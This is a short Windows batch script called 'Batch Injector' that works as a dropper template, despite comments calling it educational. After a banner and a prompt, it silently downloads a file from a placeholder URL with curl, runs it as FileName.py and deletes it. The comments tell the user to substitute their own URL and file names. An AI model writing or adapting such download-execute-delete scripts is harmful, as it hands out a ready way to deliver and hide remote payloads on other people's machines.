@echo off
title Batch Injector
color 0D

REM Change This The Way You Like
REM • Educational Purposes Only •
REM Do Not Use This To Harm

echo ~~~~~~~~~~~~~~~~~~
echo   Batch Injector
echo ~~~~~~~~~~~~~~~~~~
echo.
echo.

echo Welcome To Batch Injector
echo.
echo.

REM Injection
REM Chage The File Names
set /p inject="Would You Like To Inject"
curl -s https://urltoyourfile.com --output FileName.py
FileName.py
del FileName.py